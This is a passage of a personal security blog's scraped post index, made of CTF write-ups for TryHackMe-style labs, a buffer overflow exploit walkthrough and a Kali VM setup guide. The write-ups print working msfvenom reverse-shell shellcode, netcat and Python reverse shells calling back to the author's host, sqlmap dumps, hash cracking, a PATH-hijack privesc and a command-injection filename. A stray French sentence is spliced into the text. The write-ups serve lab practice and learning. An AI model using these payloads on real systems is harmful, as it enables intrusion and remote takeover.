ofset to locate where in the ofset it’s crashing Add BBBB to be sure I’m at the EIP. Generate bytearray with mona and Inject the same after BBBB with the script (not working with bash) Find the bad chars Find the jump Create the payload without the BadChars add the jpm Value in EIP, the NOPS then the payload","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Buffer overflow","slug":"Buffer-overflow","permalink":"https://peanutstick.github.io/tags/Buffer-overflow/"}]},{"title":"Buffer Overflow Prep 1","slug":"Buffer Overflow Prep 1","date":"2023-02-26T03:30:00.000Z","updated":"2023-04-12T14:14:27.244Z","comments":true,"path":"/post/Buffer Overflow Prep 1.html","link":"","permalink":"https://peanutstick.github.io/post/Buffer%20Overflow%20Prep%201.html","excerpt":"","text":"https://tryhackme.com/room/bufferoverflowprep PrereqYou have to start the server with the debugger.Then listen with netcat. You should have something like that: OVERFLOW 1Find where it’s crashingHe ask us to use he fuzzer to find where it’s crashing.I wand to do it myself to learn. nc 10.10.5.89 1337 &lt;&lt;&lt; \"OVERFLOW1 \"$(python -c 'print(\"A\"*100)') It’s crashing between 1500 and 2000. Between 1970 and 1990 At 1972 it’s ok, at 1973 it’s crashing. Inject the patternIn the fuzzer it’s incrementing by 100, so I don’t have to be so precise.The server crash at 1973, let’s create a string of 2000 Now let’s find the offset with mona:!mona findmsp -distance 2000 The EIP patternt is at 1978.So I have to sent the prefix “OVERFLOW1 “ + 1978 letters A + few letters B. nc -q 1 10.10.5.89 1337 &lt;&lt;&lt; \"OVERFLOW1 \"$(python -c 'print(\"A\"*1978)')\"BBBB\" BBBB = 42424242 Finding Bad CharactersWe have to do `!mona bytearray -b “\\x00”: Let’s do the same in bash. i=1 string=\"\" while [ $i != 256 ] do x=`printf \"%02x\\n\" $i` string=\"$&#123;string&#125;\\x$&#123;x&#125;\" i=$((i+1)) done echo $string I have to send the bytearray. nc -q 1 10.10.5.89 1337 &lt;&lt;&lt; \"OVERFLOW1 \"$(python -c 'print(\"A\"*1978)')\"BBBB\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\" And create it with mona too: !mona bytearray -b \"\\x00\" Now compare with the ESP rgister point: I’m gonna do a little test, let’s see what append if I remove 2 B from the payload. 2 chars is missing in the ASCII part, the \\x !mona compare -f C:\\mona\\oscp\\bytearray.bin -a esp ErrorIt’s not working because he interpret my hex code as ASCII. So I’m gonna input the payload in the python command only. nc -q 1 10.10.5.89 1337 &lt;&lt;&lt; \"OVERFLOW1 \"$(python -c 'print(\"A\"*1978 + \"B\"*4 + \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\")') Better !mona compare -f C:\\mona\\oscp\\bytearray.bin -a esp I have an another problem: The 4 first bad chars are normal but the others are not, the EIP dsplay 42424242 so it should be good, and it’s not a problem of encoding because I have the 4 first bad chars. I will remove \\x07\\x08 and \\x2e\\x2f from my payload and mona. !mona bytearray -b \"\\x00\\x07\\x08\\x2e\\x2f\" The problem still here. Why this one is not at c2 ?Where is a0 ? If we add a0 to the string and it should be good. \\x00\\x07\\x08\\x2e\\x2f\\xa0 And no, it’s not good, because for exemple \\x07\\x08:The \\x07 is the bad character but the \\x08 is corrupted \\x00\\x07\\x2e\\xa0 It was super hard at the end, Try hack me does not explain this. Find the jump point!mona jmp -r esp -cpb \"\\x00\\x07\\x2e\\xa0\" This command finds all “jmp esp” (or equivalent) instructions with addresses that don’t contain any of the badchars specified.So that’s where I can inject a shellcode without badchars.We need to convert it in little indian.You need to inverse the Bytes.So 625011af = \\xaf\\x11\\x50\\x62It will be our jmp. Generate Payload.msfvenom -p windows/shell_reverse_tcp LHOST=10.8.50.167 LPORT=4848 EXITFUNC=thread -b \"\\x00\\x07\\x2e\\xa0\" -f c shellcode += \"\\xba\\x17\\x58\\xc7\\x1e\\xda\\xd5\\xd9\\x74\\x24\\xf4\\x5e\\x31\\xc9\" shellcode += \"\\xb1\\x52\\x83\\xee\\xfc\\x31\\x56\\x0e\\x03\\x41\\x56\\x25\\xeb\\x91\" shellcode += \"\\x8e\\x2b\\x14\\x69\\x4f\\x4c\\x9c\\x8c\\x7e\\x4c\\xfa\\xc5\\xd1\\x7c\" shellcode += \"\\x88\\x8b\\xdd\\xf7\\xdc\\x3f\\x55\\x75\\xc9\\x30\\xde\\x30\\x2f\\x7f\" shellcode += \"\\xdf\\x69\\x13\\x1e\\x63\\x70\\x40\\xc0\\x5a\\xbb\\x95\\x01\\x9a\\xa6\" shellcode += \"\\x54\\x53\\x73\\xac\\xcb\\x43\\xf0\\xf8\\xd7\\xe8\\x4a\\xec\\x5f\\x0d\" shellcode += \"\\x1a\\x0f\\x71\\x80\\x10\\x56\\x51\\x23\\xf4\\xe2\\xd8\\x3b\\x19\\xce\" shellcode += \"\\x93\\xb0\\xe9\\xa4\\x25\\x10\\x20\\x44\\x89\\x5d\\x8c\\xb7\\xd3\\x9a\" shellcode += \"\\x2b\\x28\\xa6\\xd2\\x4f\\xd5\\xb1\\x21\\x2d\\x01\\x37\\xb1\\x95\\xc2\" shellcode += \"\\xef\\x1d\\x27\\x06\\x69\\xd6\\x2b\\xe3\\xfd\\xb0\\x2f\\xf2\\xd2\\xcb\" shellcode += \"\\x54\\x7f\\xd5\\x1b\\xdd\\x3b\\xf2\\xbf\\x85\\x98\\x9b\\xe6\\x63\\x4e\" shellcode += \"\\xa3\\xf8\\xcb\\x2f\\x01\\x73\\xe1\\x24\\x38\\xde\\x6e\\x88\\x71\\xe0\" shellcode += \"\\x6e\\x86\\x02\\x93\\x5c\\x09\\xb9\\x3b\\xed\\xc2\\x67\\xbc\\x12\\xf9\" shellcode += \"\\xd0\\x52\\xed\\x02\\x21\\x7b\\x2a\\x56\\x71\\x13\\x9b\\xd7\\x1a\\xe3\" shellcode += \"\\x24\\x02\\x8c\\xb3\\x8a\\xfd\\x6d\\x63\\x6b\\xae\\x05\\x69\\x64\\x91\" shellcode += \"\\x36\\x92\\xae\\xba\\xdd\\x69\\x39\\xcf\\x29\\x43\\x1e\\xa7\\x2b\\xa3\" shellcode += \"\\x72\\xc8\\xa5\\x45\\x18\\x38\\xe0\\xde\\xb5\\xa1\\xa9\\x94\\x24\\x2d\" shellcode += \"\\x64\\xd1\\x67\\xa5\\x8b\\x26\\x29\\x4e\\xe1\\x34\\xde\\xbe\\xbc\\x66\" shellcode += \"\\x49\\xc0\\x6a\\x0e\\x15\\x53\\xf1\\xce\\x50\\x48\\xae\\x99\\x35\\xbe\" shellcode += \"\\xa7\\x4f\\xa8\\x99\\x11\\x6d\\x31\\x7f\\x59\\x35\\xee\\xbc\\x64\\xb4\" shellcode += \"\\x63\\xf8\\x42\\xa6\\xbd\\x01\\xcf\\x92\\x11\\x54\\x99\\x4c\\xd4\\x0e\" shellcode += \"\\x6b\\x26\\x8e\\xfd\\x25\\xae\\x57\\xce\\xf5\\xa8\\x57\\x1b\\x80\\x54\" shellcode += \"\\xe9\\xf2\\xd5\\x6b\\xc6\\x92\\xd1\\x14\\x3a\\x03\\x1d\\xcf\\xfe\\x23\" shellcode += \"\\xfc\\xc5\\x0a\\xcc\\x59\\x8c\\xb6\\x91\\x59\\x7b\\xf4\\xaf\\xd9\\x89\" shellcode += \"\\x85\\x4b\\xc1\\xf8\\x80\\x10\\x45\\x11\\xf9\\x09\\x20\\x15\\xae\\x2a\" shellcode += \"\\x61\" Prepend NOPsThat’s something uou have to add befor the payload to let some space for the payload to unpack. padding = \"\\x90\" * 16 Preparing the Exploitcommand = \"OVERFLOW \" offset = 1978*\"A\" jmp = \"\\xaf\\x11\\x50\\x62\" nops = 16*\"\\x90\" shellcode = $(msfvenom -p windows/shell_reverse_tcp LHOST=10.8.50.167 LPORT=4848 EXITFUNC=thread -b \"\\x00\\x07\\x2e\\xa0\" -f c) string = command + offset + jmp + nops + shellcode Instead of the variable jmp we had BBBB who was in the EIPThen we put the nops to let the payload unpack EIPEIP stands for “Extended Instruction Pointer” and it is a 32-bit register that points to the memory address of the next instruction to be executed. As a program runs, EIP is updated to point to the next instruction in memory. So in our case the next instruction would be the jmp ESPESP stands for “Extended Stack Pointer” and it is a 32-bit register that points to the top of the stack. The stack is a portion of memory used to store local variables and function call data. As data is pushed onto the stack, ESP is decremented to point to the new top of the stack. As data is popped off the stack, ESP is incremented to point to the new top of the stack. EBPEBP stands for “Extended Base Pointer” and it is a 32-bit register that is used as a reference point for accessing function parameters and local variables stored on the stack. When a function is called, the value of ESP is saved in EBP, and the stack is used to store the function’s local variables and parameters. EBP is used as a reference point to access this data on the stack. https://www.uperesia.com/buffer-overflow-explained I’ah oui ok, si tu as keepass 2 c’est la même format, si tu as keepass 1 il faut migrerve learned a lot but it’s not working, even with a script on github:https://github.com/joshua17sc/Buffer-Overflows/blob/main/exploit.py","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Buffer overflow","slug":"Buffer-overflow","permalink":"https://peanutstick.github.io/tags/Buffer-overflow/"}]},{"title":"CTF BoilCTF","slug":"CTF BoilCTF","date":"2023-02-20T01:00:00.000Z","updated":"2023-04-12T14:14:27.257Z","comments":true,"path":"/post/CTF BoilCTF.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20BoilCTF.html","excerpt":"","text":"rustcanrustscan -a 10.10.242.254 Output: PORT STATE SERVICE REASON 21/tcp open ftp syn-ack 80/tcp open http syn-ack 10000/tcp open snet-sensor-mgmt syn-ack 55007/tcp open unknown syn-ack FTPftp 10.10.242.254 Let’s download it. You can decode it: https://www.dcode.fr/rot-13-cipher Just wanted to see if you find it. Lol. Remember: Enumeration is the key! Nothing int he ftp. Robots.txthttp://10.10.242.254/robots.txt kidding Port 10000Change the /etc/hosts gobustergobuster dir -u http://10.10.242.254/ -x txt,html,php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt gobuster dir -u http://10.10.242.254/joomla -x txt,html,php -w /usr/share/wordlists/dirb/common.txt Get shellhttps://www.exploit-db.com/exploits/47204 Enuminside log.txtsuperduperp@$$ Into backup.sh: superduperp@$$no1knows","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Buffer overflow","slug":"Buffer-overflow","permalink":"https://peanutstick.github.io/tags/Buffer-overflow/"}]},{"title":"CTF Wekor","slug":"CTF Wekor","date":"2023-02-19T10:57:00.000Z","updated":"2023-04-12T14:14:27.271Z","comments":true,"path":"/post/CTF Wekor.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Wekor.html","excerpt":"","text":"rustscanrustscan -a 10.10.140.46 Open 10.10.140.46:22Open 10.10.140.46:80 robots.txtUser-agent: * Disallow: &#x2F;workshop&#x2F; Disallow: &#x2F;root&#x2F; Disallow: &#x2F;lol&#x2F; Disallow: &#x2F;agent&#x2F; Disallow: &#x2F;feed Disallow: &#x2F;crawler Disallow: &#x2F;boot Disallow: &#x2F;comingreallysoon Disallow: &#x2F;interesting http://10.10.140.46/comingreallysoon/ So we found this website.http://10.10.140.46/it-next/ Gobustergobuster dir -u http://10.10.140.46/it-next/. -x txt,html,php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt SQL injectionList of dbs sqlmap -u http://10.10.140.46/it-next/it_cart.php --data=\"coupon_code=ghjghj&amp;apply_coupon=Apply+Coupon\" --dbs List of tables sqlmap -u http://10.10.140.46/it-next/it_cart.php --data=\"coupon_code=ghjghj&amp;apply_coupon=Apply+Coupon\" -D wordpress --tables Dump the table wp_user sqlmap -u http://10.10.140.46/it-next/it_cart.php --data=\"coupon_code=ghjghj&amp;apply_coupon=Apply+Coupon\" -D wordpress -T wp_users -dump Let’s put thoses hashes into a file and crack them. $P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B. $P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10 $P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/ $P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/ john hashs --wordlist=/home/peanutstick/Documents/arch_doc/CTF/Wordlist/rockyou.txt Login with wp_yura:soccer13 Wordpresshttp://site.wekor.thm/wordpress/You need to add it to your /etc/hosts RevershellWith the plugin. Then eip it: zip rev.zip revershell.php Upgrade the shellpython3 -c 'import pty;pty.spawn(\"/bin/bash\")' export TERM=xterm # allow clear command Then Ctrl + Z. stty raw -echo; fg # allow auto completion Privesc there is the tool memcached-tool in /usr/share/memcached/scripts.we can dump what’s runing on the port 11211. /usr/share/memcached/scripts/memcached-tool localhost:11211 dump Output. Dumping bucket 1 - 5 total items add id 0 1676753794 4 3476 add username 0 1676753794 4 Orka add salary 0 1676753794 8 $100,000 add password 0 1676753794 15 OrkAiSC00L24&#x2F;7$ add email 0 1676753794 14 Orka@wekor.thm With the password OrkAiSC00L24/7$ Privesc to rootsudo -l Let’s dig into this binary. strings /home/Orka/Desktop/bitcoin He use python. Orka@osboxes:~$ ls /usr/sbin/python ls: cannot access '/usr/sbin/python': No such file or directory Let’s create it. export PATH=\"/usr/sbin:$PATH\" echo \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&amp;1|nc 10.8.50.167 6666 >/tmp/f\" > /usr/sbin/python chmod +x /usr/sbin/python sudo Desktop/bitcoin I’m root. Other solution for privesc.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"sqli","slug":"sqli","permalink":"https://peanutstick.github.io/tags/sqli/"}]},{"title":"CTF Plotted-LMS","slug":"CTF_Plotted-LMS","date":"2023-02-16T21:30:00.000Z","updated":"2023-04-12T14:14:27.264Z","comments":true,"path":"/post/CTF_Plotted-LMS.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Plotted-LMS.html","excerpt":"","text":"nmapnmap -v -p- -sV 10.10.82.220 Output: PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) 8820/tcp open http Apache httpd 2.4.41 ((Ubuntu)) 9020/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 10.10.82.220:8010.10.82.220:882010.10.82.220:9020 Gobustergobuster dir -u http://10.10.82.220:9020/. -x txt,html,php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt Only the website moodle is interesting. Moodle But as I can see for the CVE-2020-14321 I need a teacher account. RCEhttps://github.com/HoangKien1020/CVE-2020-14321 It’s working for thi one, once it’s done I can’t do it again RevershellI’m gonna use this one: http://10.10.39.123:9020/moodle//blocks/rce/lang/en/block_rce.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.8.50.167%204848%20%3E%2Ftmp%2Ff It’s working. Upgrade the shellpython3 -c 'import pty;pty.spawn(\"/bin/bash\")' export TERM=xterm # allow clear command Then Ctrl + Z. stty raw -echo; fg # allow auto completion LSELinpeas was too slow, I’m gonna use lse and try linpeas later sql.bak.zip nc -l -p 4850 > sql.bak.zip cd /var/www/9020/ nc -w 3 10.8.50.167 4850 &lt; sql.bak.zip There is a password on the zip file. Crack the zip filezip2john sql.bak.zip > hash.txt john hash.txt john hash.txt --show Output: sql.bak.zip&#x2F;backup.sql:whatever:backup.sql:sql.bak.zip::sql.bak.zip Password: whatever it’s not a sql file: https://www.youtube.com/watch?v=dQw4w9WgXcQ… ok /etc/crontab cat /etc/crontab Output: # /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # Example of job definition: # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed 17 * * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily ) * * * * * plot_admin /usr/bin/python3 /home/plot_admin/backup.py 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly ) * * * * * root /usr/bin/rsync /var/log/apache2/m*_access /home/plot_admin/.logs_backup/$(/bin/date +%m.%d.%Y); /usr/bin/chown -R plot_admin:plot_admin /home/plot_admin/.logs_backup/$(/bin/date +%m.%d.%Y) # This line is interesting : * * * * * plot_admin /usr/bin/python3 /home/plot_admin/backup.py /home/plot_admin/backup.py import os moodle_location = \"/var/www/uploadedfiles/filedir/\" backup_location = \"/home/plot_admin/.moodle_backup/\" os.system(\"/usr/bin/rm -rf \" + backup_location + \"*\") for (root,dirs,files) in os.walk(moodle_location): for file in files: os.system('/usr/bin/cp \"' + root + '/' + file + '\" ' + backup_location) At the line os.system he remove everything in backup_location, to do that he use *.So in the directory /var/www/uploadedfiles/filedir you can create a file where the file name will be interpreted as a command. touch '\"|chmod -R 777 .|\"' Now we can write and read into /home/plot_admin. PrivescNow I will add a python revershell into the backup script.https://www.revshells.com/ import socket import subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\"10.8.50.167\",6666)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) import pty pty.spawn(\"bash\") I have the user plot_admin. Now I need a better shell, let’s use ssh. But I juste broke the machine again, there is not enough ram or cpu IDK.Even the website is not responding.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[]},{"title":"Install Kali with QEMU","slug":"Install of kali on Arch with QEMU","date":"2023-02-11T07:56:00.000Z","updated":"2023-04-12T15:10:22.386Z","comments":true,"path":"/post/Install of kali on Arch with QEMU.html","link":"","permalink":"https://peanutstick.github.io/post/Install%20of%20kali%20on%20Arch%20with%20QEMU.html","excerpt":"","text":"WhyBecause I had lot of problems with python2 and 3 who broke my packages like wfuff.Plus, it’s not that good to have lot of hacking tools on my main computer, it’s taking lot of space and the updates are longer.I need more space to install cool games like nier automata. Donwnload kalihttps://www.kali.org/get-kali/#kali-virtual-machines Install qemusudo pacman -S qemu Create a bridgesudo ip link add name br0 type bridge sudo ip link set br0 up sudo ip link set enp34s0 master br0 sudo ip addr add 192.168.1.70/24 dev br0 Remove the bridgedon’t do this rn, it will be used later sudo ip link set dev enp34s0 nomaster sudo ip link delete dev br0 Start the VMqemu-system-x86_64 \\ -enable-kvm \\ -m 4096 \\ -smp 4 -cpu host \\ -net nic,model=virtio \\ -net bridge,br=br0 \\ -drive file=kali-linux-2022.4-qemu-amd64.qcow2,media=disk,if=virtio Now let’s see the IP of kali:192.168.1.111 Enable ssh in kali: sudo systemctl start ssh sudo systemctl enable ssh Start without displayqemu-system-x86_64 \\ -enable-kvm \\ -m 4096 \\ -smp 4 -cpu host \\ -nographic \\ -net nic,model=virtio \\ -net bridge,br=br0 \\ -drive file=kali-linux-2022.4-qemu-amd64.qcow2,media=disk,if=virtio Script itNow I want a script for this, also, I don’t want the bridge to be here when I don’t use kali.you have to replace enp34s0 by the name of your card (do ip a).also replace 192.168.1.70 by something who can communicate in your local network. sudo /usr/local/bin/kali sudo ip link add name br0 type bridge sudo ip link set br0 up sudo ip link set enp34s0 master br0 sudo ip addr add 192.168.1.70/24 dev br0 qemu-system-x86_64 \\ -enable-kvm \\ -m 4096 \\ -smp 4 -cpu host \\ -net nic,model=virtio \\ -nographic \\ -net bridge,br=br0 \\ -drive file=/home/peanutstick/qemu_storage/kali-linux-2022.4-qemu-amd64.qcow2,media=disk,if=virtio sudo ip link set dev enp34s0 nomaster sudo ip link delete dev br0 Export X11/etc/ssh/ssh_config Host * ForwardAgent yes ForwardX11 yes SSHssh -Y kali@192.168.1.111 Bug in ssh ?If you can’t clear the terminal when you are logged, use this and try again.Do this in kali. echo \"export TERM=xterm-256color\" > .zsh_rc Teste coJust run burpsuite and see: yep, xorg is good RDPKaliCreate the RDP server: sudo pacman -S xrdp sudo systemctl enable xrdp sudo systemctl start xrdp HostInstall remmina: sudo pacman -S remmina Encrypt the password: remmina --encrypt-password Then enter the password.Output: Enter the password you want to encrypt: kali Encrypted password: Nq7turSoD7g&#x3D; Usage: rdp:&#x2F;&#x2F;username:Nq7turSoD7g&#x3D;@server vnc:&#x2F;&#x2F;username:Nq7turSoD7g&#x3D;@server vnc:&#x2F;&#x2F;server?VncUsername&#x3D;user\\&amp;VncPassword&#x3D;Nq7turSoD7g%3D Connect to kali: remmina -c rdp://kali:Nq7turSoD7g=@192.168.1.111 To change the resolution, click here: Remmina is cool but, I don’t like it very much, he can resize himself but there is too much things.I would like to have just a window without anyhing on the borders. You can add aliases like: alias kalis=\"ssh -Y kali@192.168.1.111\" alias kalir=\"remmina -c rdp://kali:Nq7turSoD7g=@192.168.1.111\" Result:","categories":[{"name":"Tips","slug":"Tips","permalink":"https://peanutstick.github.io/categories/Tips/"}],"tags":[]},{"title":"CTF Wgel CTF","slug":"CTF Wgel CTF","date":"2023-02-06T01:20:00.000Z","updated":"2023-04-12T14:14:27.271Z","comments":true,"path":"/post/CTF Wgel CTF.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Wgel%20CTF.html","excerpt":"","text":"Rustscanrustscan -a 10.10.227.219 Browse the website This is the default page. We have a user, Jessie Gobustergobuster dir -u http://10.10.227.219/. -x txt,html,php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt Let’s run an anoter scan in sitemap.I’ve tries with the same wordlist but nothing came out.So I’m using an another one. gobuster dir -u http://10.10.227.219/sitemap -x txt,html,php -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt Download id_rsa wget http://10.10.227.219/sitemap/.ssh/id_rsa SSHchmod 600 id_rsa ssh -i id_rsa jessie@10.10.227.219 First flag There is no tabulation. root flagsudo /usr/bin/wget -i /root/root_flag.txt https://gtfobins.github.io/gtfobins/wget/10.10.14.154","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"privesc","slug":"privesc","permalink":"https://peanutstick.github.io/tags/privesc/"}]},{"title":"CTF Ignite","slug":"CTF Ignite","date":"2023-01-30T00:20:00.000Z","updated":"2023-04-12T14:14:27.261Z","comments":true,"path":"/post/CTF Ignite.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Ignite.html","excerpt":"","text":"rustscan Gobustergobuster dir -u http://10.10.219.98 -x txt,html,php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt Not interesting. Robots.txt It’s the login page of the CMS The config file is here: User password of the login page So if I user admin:admin in the login page it’s working. Useless, let’s searsh for an exploit. revershellhttps://github.com/AssassinUKG/fuleCMS Upgrade my shell: python -c 'import pty; pty.spawn(\"/bin/bash\")' Enum with linpeasMy computer: Target: Then run it. chmod +x l* ./l* Linpeas is maybe overkill for this box, lse.sh is good for this kind of box. CVE Can be root in a sec with this exploit. Password in config file Let’s try it on root The CTF is over.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"CMS","slug":"CMS","permalink":"https://peanutstick.github.io/tags/CMS/"}]},{"title":"Learn CTF on windows","slug":"Learn CTF on windows","date":"2023-01-15T01:26:00.000Z","updated":"2023-04-12T14:14:27.274Z","comments":true,"path":"/post/Learn CTF on windows.html","link":"","permalink":"https://peanutstick.github.io/post/Learn%20CTF%20on%20windows.html","excerpt":"","text":"HowI don’t like courses, if I don’t look for the information myself it’s not effective.So I’m going to look for beginner’s articles, find the tools and read what it does on github.While I read it, I will write it here and at the end on the day I will do a CTF on windows. Let’s begin: How to search on googleIt’s not nessesary, but I would like to share how I do it.it’s not amazing but I saw too many ppl who write the full sentence on google with uppercase, punctuation and potency formula… How I do: Few words (subject, verb): windows ctf writeup windows ctf boot to root boot to root windows writeur hack the box windows We don’t care of the order of the words Middle click on every links to open the in a new tab Scroll very fast without reading on the first one, if I feel like it’s useless (ctrl+w) You can also search for the word windows . And there is the interesting links: https://cybergladius.com/htb-walkthrough-support/ https://www.hackingarticles.in/writer-hackthebox-walkthrough/ https://systemweakness.com/flatline-windows-hacking-tryhackme-ctf-ac57b03a80a1 https://www.youtube.com/watch?v=iIveZ-raTTQ&amp;list=PLidcsTyj9JXL4Jv6u9qi8TcUgsNoKKHNn https://haax.fr/fr/walkthroughs/hackthebox/remote/ It’s enough, let’s start working. Find sub domaindig @$ip +short support.htp any If you find somethign you have to white it in the /etc/hosts. Sambasmbclient -N -L \\\\\\\\$IP -L to list-N to supress password promptIt will work only if the guest login is ennabled. Then : smbclient -N \\\\\\\\$ip\\\\share Now you can use ? to display the commands, I mainly use get, ls and dir. To download all the files in a directory: Smetimes mask is not needed. SMB:> mask \"\" SMB:> recurse ON SMB:> prompt OFF 